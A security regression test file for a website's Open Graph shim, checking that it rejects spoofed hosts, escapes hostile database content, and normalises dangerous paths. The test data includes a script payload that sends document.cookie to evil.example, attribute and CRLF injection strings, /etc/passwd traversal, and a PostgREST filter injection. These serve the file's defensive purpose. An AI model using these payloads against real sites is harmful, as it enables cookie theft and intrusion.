/**
 * Security regression tests for the crawler Open Graph shim (api/og.js).
 * Findings AF-03 (host-header cache poisoning) and the escaping guarantees the
 * file's header comment promises.
 */
import { describe, expect, it } from "vitest";
// @ts-expect-error - api/og.js is plain JS outside the typechecked projects.
import { __test__ } from "../../api/og.js";

const { describeRoute, escapeHtml, isAllowedOgHost, normalisePath, renderDocument, resolveOriginFrom } = __test__;

describe("AF-03 the OG shim only echoes hosts it owns", () => {
  it("accepts the production alias, branch aliases and localhost", () => {
    expect(isAllowedOgHost("moto-gp-chi.vercel.app")).toBe(true);
    expect(isAllowedOgHost("moto-gp-git-master-someteam.vercel.app")).toBe(true);
    expect(isAllowedOgHost("MOTO-GP-CHI.VERCEL.APP")).toBe(true);
    expect(isAllowedOgHost("localhost:8080")).toBe(true);
  });

  it("rejects attacker-supplied hosts, including look-alikes", () => {
    for (const host of [
      "evil.example",
      "moto-gp-chi.vercel.app.evil.example",
      "attacker.vercel.app",
      "evil-moto-gp-chi.vercel.app",
      "moto-gp-chi.vercel.app@evil.example",
      "moto-gp-chi.vercel.app\r\nX-Injected: 1",
      "",
      "a".repeat(300),
    ]) {
      expect(isAllowedOgHost(host), `${JSON.stringify(host)} must be rejected`).toBe(false);
    }
  });

  it("falls back to the canonical origin instead of echoing X-Forwarded-Host", () => {
    expect(resolveOriginFrom({ "x-forwarded-host": "evil.example" }, {})).toBe("https://moto-gp-chi.vercel.app");
    expect(resolveOriginFrom({ host: "evil.example" }, {})).toBe("https://moto-gp-chi.vercel.app");
    expect(resolveOriginFrom({ "x-forwarded-host": "moto-gp-chi.vercel.app" }, {})).toBe(
      "https://moto-gp-chi.vercel.app",
    );
  });

  it("never downgrades a public host to http", () => {
    const origin = resolveOriginFrom(
      { "x-forwarded-host": "moto-gp-chi.vercel.app", "x-forwarded-proto": "http" },
      {},
    );
    expect(origin.startsWith("https://")).toBe(true);
  });

  it("prefers an explicitly configured origin over any request header", () => {
    expect(
      resolveOriginFrom({ "x-forwarded-host": "evil.example" }, { PUBLIC_ORIGIN: "https://autoflex.example/x" }),
    ).toBe("https://autoflex.example");
  });

  it("ignores an unrecognised VERCEL_URL rather than trusting it blindly", () => {
    expect(resolveOriginFrom({}, { VERCEL_URL: "evil.example" })).toBe("https://moto-gp-chi.vercel.app");
  });
});

describe("the OG shim escapes hostile database content", () => {
  it("escapes every character that could break out of an attribute or element", () => {
    expect(escapeHtml(`<script>alert(1)</script>`)).toBe("&lt;script&gt;alert(1)&lt;/script&gt;");
    expect(escapeHtml(`" onload="alert(1)`)).toBe("&quot; onload=&quot;alert(1)");
    expect(escapeHtml(`' onerror='alert(1)`)).toBe("&#39; onerror=&#39;alert(1)");
    expect(escapeHtml("a & b")).toBe("a &amp; b");
  });

  it("renders an attacker-controlled title/description without executable markup", () => {
    // A signed-in user can write these strings into the anon-readable
    // owner_posts / model_playbooks / city_circles rows the shim reads.
    const hostile = `</title><script>fetch('https://evil.example?c='+document.cookie)</script>`;
    const html = renderDocument({
      canonical: "https://moto-gp-chi.vercel.app/community/x",
      description: `" onload="alert(1)`,
      imageUrl: "https://moto-gp-chi.vercel.app/og-cover.png",
      indexable: false,
      path: "/community/x",
      title: hostile,
    });

    expect(html).not.toContain("<script>");
    expect(html).not.toContain(`onload="alert(1)"`);
    expect(html).toContain("&lt;script&gt;");
    expect(html).toContain("&quot; onload=&quot;alert(1)");
    // Exactly one real <title> element survives.
    expect(html.match(/<title>/g)).toHaveLength(1);
  });

  it("keeps the meta-refresh target relative and escaped", () => {
    const html = renderDocument({
      canonical: "https://moto-gp-chi.vercel.app/",
      description: "d",
      imageUrl: "https://moto-gp-chi.vercel.app/og-cover.png",
      indexable: false,
      path: `/x" onmouseover="alert(1)`,
      title: "t",
    });
    expect(html).not.toContain(`onmouseover="alert(1)"`);
    expect(html).toContain("&quot; onmouseover=&quot;alert(1)");
  });
});

describe("the OG shim normalises hostile paths", () => {
  it("neutralises traversal, protocol-relative, encoded and control-character paths", () => {
    expect(normalisePath("/../../etc/passwd")).toBe("/");
    expect(normalisePath("//evil.example/x")).toBe("/evil.example/x");
    expect(normalisePath("/%2e%2e/secret")).toBe("/");
    expect(normalisePath("/community\\evil")).toBe("/");
    expect(normalisePath("/x\r\nSet-Cookie: a=b")).toBe("/");
    expect(normalisePath(`/x${"y".repeat(400)}`)).toBe("/");
    expect(normalisePath("/community/abc?next=//evil.example")).toBe("/community/abc");
    expect(normalisePath(undefined)).toBe("/");
    expect(normalisePath(["/community", "/other"])).toBe("/community");
  });

  it("only builds a Supabase lookup from an id/slug that passed validation", () => {
    // Anything that could alter the PostgREST filter degrades to a screen route,
    // so no unvalidated string ever reaches the REST URL.
    expect(describeRoute("/community/ok-id_1")).toMatchObject({ id: "ok-id_1", kind: "post" });
    expect(describeRoute("/community/id,or.true")).toEqual({ kind: "screen", path: "/community" });
    expect(describeRoute("/cars/Bad Slug")).toEqual({ kind: "screen", path: "/cars" });
    expect(describeRoute("/cities/x*")).toEqual({ kind: "screen", path: "/cities" });
    expect(describeRoute("/a/b/c/d")).toEqual({ kind: "screen", path: "/" });
  });
});
